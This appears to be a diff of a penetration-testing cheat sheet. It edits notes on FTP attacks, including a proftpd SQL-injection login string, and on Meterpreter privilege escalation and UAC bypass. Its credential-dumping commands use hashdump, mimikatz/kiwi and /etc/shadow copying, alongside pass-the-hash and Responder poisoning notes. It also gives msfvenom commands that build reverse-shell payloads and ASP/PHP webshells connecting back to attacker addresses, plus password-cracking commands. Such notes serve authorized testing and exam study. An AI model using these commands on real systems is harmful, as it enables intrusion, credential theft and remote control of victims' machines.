@@ -311,6 +311,9 @@ proftpd?      USER %') and 1=2 union select 1,1,uid,gid,homedir,shell from users
 
 nmap -p 21 -sV –script=ftp* xxx.xxx.xxx.xxx
 
+recursively download all centents of ftp server (with creds)
+wget -r ftp://username:password@ftp.example.com/
+
 
 SQL
 
@@ -615,13 +618,13 @@ priv escalation
 meterpreter > use priv
 meterpreter > getsystem
 (look into udev or rds)
-meterpreter > run post/
-meterpreter > use exploit/windows/local/bypassuac (Win7+)
+meterpreter > run post/ (tab complete for options)
+msf5 > use exploit/windows/local/bypassuac (Win7+)  (make sure to set correct session)
 
 creds
 msf> run post/windows/gather/hashdump
 meterpreter > hashdump (pulls from memory)
-meterpreter > run hashdump (pulls from disk)
+meterpreter > run post/windows/gather/smart_hashdump (pulls from disk)
 look for backup copies of SAM database under C:/windows/repair, or C:/windows/backup
 
 copy /etc/passwd and /etc/shadow if *nix	
@@ -631,11 +634,13 @@ meterpreter> creds_all      (pull plaintext creds out of memory)
 meterpeter> msv
 meterpeter> Kerberos
 meterpeter> wdigest (kiwi command for older systems)
-meterpreter> load mimikatz
+meterpreter> load mimikatz (use for older systems, kiwi for newer ones)
 meterpreter> mimikatz_command -f samdump::hashes
+
 LANMAN? Easy to crack
 NTLM? If you can get hashes, pass-the-hash!
 Net-NTLM? Can’t pass the hash
+
 Active Directory on a domain? Start running Responder - LLMNR/NBT-NS/MDNS poisoner - 
 Linux: watch for Salts depending on distro
 
@@ -836,8 +841,7 @@ xfreerdp /size:1024x768 /cert-ignore /v:10.12.1.124:3389 /u:username            
 
 C2 with meterpreter: Custom shells
 Windows:
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On]
--f exe -o met_win_tcp_reverse.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f exe -o met_win_tcp_reverse.exe
 (try win reverse https)
 Linux:
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f elf > shell.elf
@@ -846,6 +850,7 @@ Mac:
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[Your IP Address] LPORT=[Your Port to Connect On] -f macho > shell.macho
 WAR with apache tomcat:
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
+
 new msfvenom commands and uses:
 https://forums.offensive-security.com/showthread.php?t=3215 
 Metasploit custom payloads of all kinds:
@@ -868,6 +873,7 @@ Webshells:
 
 ASP
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.136 LPORT=53 -f asp -o shell.asp
+^IIS servers
 
 PHP
 root@kal:/tmp# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.1.229 LPORT=53 -f raw -o shell.php
@@ -946,6 +952,7 @@ Enumerate as much as you can! Then,
 
 Windows:
 http://www.fuzzysecurity.com/tutorials/16.html 
+https://guif.re/windowseop
 https://github.com/pentestmonkey/windows-privesc-check/ 
 https://github.com/411Hall/JAWS/ 
 -Check net user and admin and user rights
@@ -954,6 +961,8 @@ https://github.com/411Hall/JAWS/
 getsystem
 kiwi – creds_kerberos       creds_all   
 -check for weird programs or non-standard registry keys
+hashdump
+run hashdump
 
 Linux:
 https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ 
@@ -1074,7 +1083,7 @@ hash-identifier (kali)
 
 john the ripper (classic CPU based cracker, tons formats and decent auto-detection) better than hashcat for small passwords
 ./unshadow script in john (linux/unix)
-john --format=format --wordlist=/path/to/wordlist.txt hashes.file
+john --format=format --wordlist=/path/to/wordlist.txt --pot=target.pot hashes.file
 john –show hashes.file
 
 
